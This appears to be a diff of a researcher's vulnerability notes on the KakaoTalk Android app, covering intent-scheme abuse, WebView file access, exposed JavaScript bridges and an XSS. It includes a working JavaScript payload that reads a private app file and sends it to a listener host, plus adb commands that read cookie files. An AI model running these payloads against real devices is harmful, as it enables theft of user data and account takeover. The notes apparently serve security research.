@@ -38,7 +38,7 @@
 
 ## Findings
 
-- Account takeover
+- Account takeover (only via MITM in the same network)
   - Send malicious link
   - Steal token
   - `update_settings.json` -> change e-mail
@@ -78,9 +78,8 @@ curl -i -s -k -X $'POST' \
 ```
 - I can MITM TLS connections. There's just a security warning in KakaoTalk's UI that the user can accept (no need to put a Burp CA cert into Android trusted CA store).
 - I can start arbitrary components via the `intent:` scheme in `CommerceBuyActivity` (`kakaotalk://buy`)
-- I can exfiltrate files via the `intent:` scheme in `CommerceBuyActivity` and opening `content://` URLs in `MyProfileSettingsActivity`:
+  - I can exfiltrate files by sending Intents with `content://` URLs to `MyProfileSettingsActivity`:
 ```javascript
-location.href = "kakaotalk://buy";
 // Read Firebase Installation configuration
 location.href = "intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json;end"
 var data = document.querySelector('pre').innerHTML;
@@ -91,7 +90,7 @@ img.src = 'http://10.0.2.2:8888?data=' + encodeURIComponent(data);
   - `adb shell am start "intent:#Intent\;component=com.kakao.talk/.gametab.view.KGPopupActivity\;S.url=https://foo.com\;end"`
   - `location.href = "intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=http://10.0.2.2:8888/;end"`
   - `location.href = "intent:#Intent;component=com.kakao.talk/com.kakao.talk.commerce.ui.shopper.CommerceShopperWebViewActivity;S.URL=https://foo.com;end"`
-  - `ConnectBroadcastFriendsPickerActivity` -> `kakaointernalweb://host/q?url=https://www.foo.com&spamType=0&isPlusType=true'`
+  - `InAppBrowserActivity` -> `kakaointernalweb://host/q?url=https://www.foo.com&spamType=0&isPlusType=true`
   - `BizInAppBrowserActivity`-> `kakaotalk://bizwebview/open?url=http://www.foo.com`
 - I can execute Javascript by:
   - Pointing to attacker-controlled URLs
@@ -101,12 +100,11 @@ img.src = 'http://10.0.2.2:8888?data=' + encodeURIComponent(data);
   - `location.href = "intent:#Intent;component=com.kakao.talk/.activity.kakaomail.KaKaoMailDocumentViewWebActivity;S.url=content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json;S.subContent=foo;end"`
   - Reading a cookie: `adb shell content read --uri "content://com.kakao.talk.FileProvider/external_files/emulated/0/Android/data/com.kakao.talk/KakaoTalk/cookie/.57f323da7592b0b5de1360de3da701b0d1aa6627"`
   - Using the `android-app:` scheme: `adb shell am start "android-app://#Intent\;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity\;S.EXTRA_URL=content://com.kakao.talk.FileProvider/external_files/emulated/0/Android/data/com.kakao.talk/KakaoTalk/cookie/.57f323da7592b0b5de1360de3da701b0d1aa6627\;end"`
-- I can access the user's location by exposed Javascript interfaces
+- There are a couple of Javascript interfaces that access the user's location (see below)
 - Auto-download to `/sdcard/Download` via Chrome (`app://kakaotalk/openURL?url=`)
 - I can access other `BROWSABLE` Activities or Apps via the `android-app:` scheme, e.g.:
   - `location.href = "android-app://com.google.android.googlequicksearchbox/https/www.google.com"`
-  - `location.href = "android-app://com.kakao.talk/kakaotalk/hairshop#Intent;package=com.kakao.talk;end"`
-- `setWebContentsDebuggingEnabled` seems to be enabled for most WebViews
+- `setWebContentsDebuggingEnabled` is enabled for most WebViews
 - XSS in `com.kakao.talk.activity.cscenter.CsCenterActivity` (search field)
     - https://cs.kakao.com/search?query=%3Cscript%3Ealert%281%29%3C%2Fscript%3E (you need to click into the search field)
 
@@ -139,15 +137,57 @@ curl -i -s -k -X $'POST' \
 
 ### @JavascriptInterface
 
-- **TO-DO:** Check interfaces that expose location information
-- Search for custom Javascript->Native bridges
-- `KvKakaoViewJavascriptInterface` -> `loadURL()`
-- `BaseWebViewActivity` -> `saveImage()`
+- `KvKakaoViewJavascriptInterface` -> `kakaoview` interface
+  - `loadURL()`
+- `KvKakaoTalkJavascriptInterface`
+  - `getCurrentLocation(String str)`
+- `BaseWebViewActivity` -> `webview` interface
+  - `saveImage()`
 - `NamecardWebActivity` -> `saveImage()`
-- `JdSearchWebScriptInterface` `saveImage()`
-- `VCBridgeJavascriptInterface` -> `writeData()` and `readData()` methods
-- `DigitalDocsWebActivity` -> `webview_mount()`
-- `KakaoBizWebJavascriptInterface` -> `executeBizWebExtension()`
+- `JdSearchWebScriptInterface` -> `kakaoweb` interface
+  - `saveImage()`
+  - `requestLocationString(final String str)`
+- `JdSearchWebCardScriptInterface` -> `kakaotalk` interface
+  - `requestLocation()`
+  - `requestLocationWithParam(String str)`
+  - `updateJson(String str)`
+- `VCBridgeJavascriptInterface` -> `vc` interface -> used in `ShakeWebActivity`
+  - `checkKakaoCertAvailable(String str)`
+  - `writeData()`
+  - `readData()`
+- `DigitalDocsWebActivity` -> `digitalDocs` interface
+  - `webview_mount()` (seems to load a URL)
+- `KakaoBizWebJavascriptInterface` -> `kakaoBizWebExtensionNative` interface
+  - `executeBizWebExtension()`
+- `kakaotalk://order` (`KakaoOrderActivity`) -> `kakaoTalk` interface
+  - `getAuthorization()`
+  - `getGeolocation()`
+  - `listenSms()`
+  - `openKakaoOrderFileChoose()`
+  - `openKakaoOrderShortcut()`
+- `KakaoHairshopActivity` (`kakaotalk://hairshop`) -> `kakaoTalk` interface
+  - `getAuthorization()`
+  - `getGeolocation()`
+  - `getGeolocationForce()`
+- `CommerceMakersActivity` (`kakaotalk://makers`) -> `kakaoTalk` interface
+  - `openExternalUrl(String str)`
+- `KGWebView` (`kakaotalk://gamecenter`) -> `Gametab` interface
+  - `api(String str, String str2, String str3)` -> available commands in `KGWebViewCommands` class
+  - `kgapi(String str, String str2, String str3`
+- `PlusHomeWebLayout` -> `kakaoTalk` interface
+  - `getGeolocation()`
+  - `getGeolocationForce()`
+  - `isLocationAgreed()`
+- `CheckoutActivity` -> `kakaotalk` interface
+  - `addTalkChannel(long j)`
+- `SubscriptionIapWebActivity` -> `kakaoSubscription` interface
+  - `requestInAppPurchase(String str)`
+- `PlusEventScriptInterface`
+  - `copyClipboard(String str, String str2)`
+- `WebViewSignedLocationInterface` -> `native` interface
+  - `reqSignInLocation(String str, String str2)`
+- `KakaoTvPayJavascriptInterface` -> `kakaotv` interface -> used in `KakaoTvPayActivity`
+  - `purchaseItem(String str)`
 
 ### CSRF
 
@@ -193,7 +233,7 @@ curl -i -s -k -X $'POST' \
 
 ### Deeplinks
 
-- Check `kakaolink://` deep links
+- Check `kakaolink://` links
 - `InAppBrowserActivity` -> `kakaotalk://inappbrowser`
 - `KakaoOrderActivity` (`kakaotalk://order`)
 - `kakaotalk://store`
@@ -215,11 +255,18 @@ curl -i -s -k -X $'POST' \
 
 ### Misc
 
+- Try to send intents to `com.kakao.talk.service.MessengerService` (via `kakaotalk://buy` Webview)
 - Clicking on https://auth.kakao.com in the KakaoTalk UI leads to `KakaoAccountSettingsActivity`
-- Switch to a different Activity via `continue` parameter -> `https://auth.kakao.com/kakao_accounts/talk/check_password?continue=kakaotalk://main`
-- When opening `content:` URIs I end up in the `null` origin -> `XMLHttpRequest` to `http` schemes works here
+- Switch to a different Activity via `continue` parameter -> `https://auth.kakao.com/kakao_accounts?continue=kakaotalk://main`
+- When opening `content:` URIs I end up in the `null` origin -> `XMLHttpRequest` to `http` scheme works here
 
 ## Resources
+
+- [CORS and WebView API](https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/cors-and-webview-api.md)
+- [Intent Scheme](https://www.mbsd.jp/Whitepaper/IntentScheme.pdf)
+- [Defcon WebView Training](https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20workshops/DEF%20CON%2026%20-%20Workshop-David-Turco-and-Jon-Overgaard-Christiansen-Wheres-My-Browser-Learn-Hacking-iOS-and-Android-WebViews.pdf)
+- [Android security checklist: WebView](https://blog.oversecured.com/Android-security-checklist-webview/)
+- [Reviewing Android Webviews fileAccess attack vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
 
 ## Appendix
 
@@ -268,7 +315,7 @@ One-liner:
 - `KGPopupActivity` (`kakaotalk://gamecenter`)
 - `webViewSettings.setAllowFileAccessFromFileURLs(true);`
 - `webViewSettings.setAllowUniversalAccessFromFileURLs(true);`
-- Intent scheme allowed
+- Intent scheme allowed (but compontent and selector are set to null)
 - There are `KG`, `Kakao` and `kakaoweb` JS APIs
 - JavaScript-Native Bridge
   - `Gametab.api("talk/toolbar/show", '', '');` —> defined in class `KGWebViewCommands`
